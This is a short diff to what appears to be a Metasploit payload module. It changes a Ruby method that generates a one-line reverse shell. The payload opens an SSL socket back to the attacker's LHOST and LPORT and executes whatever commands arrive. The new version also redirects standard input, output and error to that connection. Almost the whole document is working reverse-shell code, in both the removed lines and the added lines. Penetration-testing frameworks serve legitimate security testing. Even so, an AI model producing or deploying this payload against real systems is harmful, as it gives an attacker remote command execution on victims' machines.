@@ -46,7 +46,10 @@ module Metasploit3
 	def ruby_string
 		lhost = datastore['LHOST']
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		rbs = "require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
-		return rbs
+
+		"require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;"+
+		"$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;" + 
+		"IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }" +
+		"}}"
 	end
 end
